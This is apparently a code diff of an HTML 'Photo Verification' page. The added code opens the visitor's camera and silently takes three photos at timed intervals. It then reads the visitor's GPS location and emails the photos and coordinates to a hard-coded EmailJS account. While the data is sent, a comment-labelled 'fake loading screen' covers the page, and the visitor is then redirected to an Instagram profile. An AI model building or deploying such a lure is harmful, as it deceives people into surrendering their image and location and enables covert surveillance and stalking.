@@ -2,84 +2,178 @@
 <html>
 <head>
     <title>Photo Verification</title>
+
+<style>
+#video {
+    width: 300px;
+    border: 2px solid black;
+}
+
+/* Fake Loading Screen */
+#loading {
+    display: none;
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: black;
+    color: white;
+    font-size: 28px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+}
+</style>
 </head>
+
 <body>
 
 <h2>Photo Verification</h2>
 
 <button onclick="startCamera()">Open Camera</button>
-<button onclick="takePhoto()">Take Photo</button>
 
 <p id="status"></p>
 
-<video id="video" width="320" height="240" autoplay></video>
-<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+<!-- Fake loading screen -->
+<div id="loading">Processing… please wait</div>
 
-<!-- EmailJS Library -->
+<!-- Camera preview -->
+<video id="video" autoplay playsinline></video>
+
+<!-- Canvas for capturing photos (hidden) -->
+<canvas id="canvas" width="200" height="200" style="display:none;"></canvas>
+
+<!-- EmailJS -->
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-
-<!-- Initialize EmailJS -->
 <script>
-emailjs.init("vieRRG0Q8QGFFS-XO");
+emailjs.init("vieRRG0Q8QGFFS-XO"); 
 </script>
 
-<!-- MAIN SCRIPT -->
 <script>
-
 let stream;
+let photos = [];
+let photoCount = 0;
 
-// Start camera
+// -------------------------
+// START CAMERA
+// -------------------------
 async function startCamera() {
     try {
+        const video = document.getElementById("video");
         stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        document.getElementById("video").srcObject = stream;
-        document.getElementById("status").innerText = "Camera started!";
+        video.srcObject = stream;
+
+        document.getElementById("status").innerText =
+            "Camera started... capturing photos in 2 seconds";
+
+        setTimeout(() => {
+            takeMultiplePhotos();
+        }, 2000);
+
     } catch (err) {
-        document.getElementById("status").innerText = "Camera permission denied.";
+        document.getElementById("status").innerText =
+            "Camera permission denied.";
     }
 }
 
-// Take photo & send
-function takePhoto() {
+// -------------------------
+// AUTO MULTIPLE PHOTOS
+// -------------------------
+function takeMultiplePhotos() {
+    if (photoCount >= 3) {
+        document.getElementById("status").innerText =
+            "Photos done. Getting location…";
+        getLocationAndSend();
+        return;
+    }
+
+    setTimeout(() => {
+        capturePhoto();
+        photoCount++;
+        takeMultiplePhotos();
+    }, 2000);
+}
+
+// -------------------------
+// CAPTURE A SINGLE PHOTO
+// -------------------------
+function capturePhoto() {
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
-    const context = canvas.getContext("2d");
+    const ctx = canvas.getContext("2d");
 
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    ctx.drawImage(video, 0, 0, 200, 200);
 
-    const image = canvas.toDataURL("image/jpeg", 0.5);
+    const img = canvas.toDataURL("image/jpeg", 0.1); // compressed
 
-    document.getElementById("status").innerText = "Photo taken. Getting location...";
+    photos.push(img);
 
-    // Get location
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition((pos) => {
-
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const locationString = lat + ", " + lon;
-
-            // SEND EMAIL USING EMAILJS
-           emailjs.send("service_c2bqpj9", "template_pee9jcq", {
-                photo: image,
-                location: locationString
-            })
-            .then(() => {
-                document.getElementById("status").innerText = "Photo & location sent to your email!";
-            })
-            .catch((err) => {
-                document.getElementById("status").innerText = "Error sending email.";
-                console.error(err);
-            });
-
-        }, () => {
-            document.getElementById("status").innerText = "Location permission denied.";
-        });
-    } else {
-        document.getElementById("status").innerText = "Geolocation not supported.";
-    }
+    document.getElementById("status").innerText =
+        `Captured photo ${photoCount + 1} of 3`;
 }
 
+// -------------------------
+// GET LOCATION
+// -------------------------
+function getLocationAndSend() {
+    navigator.geolocation.getCurrentPosition(
+        (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const loc = `${lat}, ${lon}`;
+
+            sendWithRetry(loc, 3);
+        },
+        () => {
+            document.getElementById("status").innerText =
+                "Location blocked.";
+        }
+    );
+}
+
+// -------------------------
+// AUTO-RETRY EMAIL SENDING
+// -------------------------
+function sendWithRetry(location, retries) {
+    document.getElementById("status").innerText = "Sending data…";
+
+    // Fake loading screen ON
+    document.getElementById("loading").style.display = "flex";
+
+    emailjs.send("service_c2bqpj9", "template_pee9jcq", {
+        location: location,
+        photo1: photos[0],
+        photo2: photos[1],
+        photo3: photos[2],
+    })
+    .then(() => {
+        document.getElementById("status").innerText =
+            "Success! Redirecting…";
+
+        // Fake loading screen OFF
+        document.getElementById("loading").style.display = "none";
+
+        setTimeout(() => {
+            window.location.href =
+                "https://www.instagram.com/_ansh_._katiyar_?igsh=MW9mYW1rNzFmN2tvZg%3D%3D&utm_source=qr";
+        }, 2000);
+    })
+    .catch((err) => {
+        if (retries > 0) {
+            document.getElementById("status").innerText =
+                `Send failed. Retrying (${retries})…`;
+
+            setTimeout(() => {
+                sendWithRetry(location, retries - 1);
+            }, 3000);
+        } else {
+            document.getElementById("status").innerText =
+                "Failed after 3 attempts.";
+            document.getElementById("loading").style.display = "none";
+            console.error(err);
+        }
+    });
+}
 </script>
 
 </body>
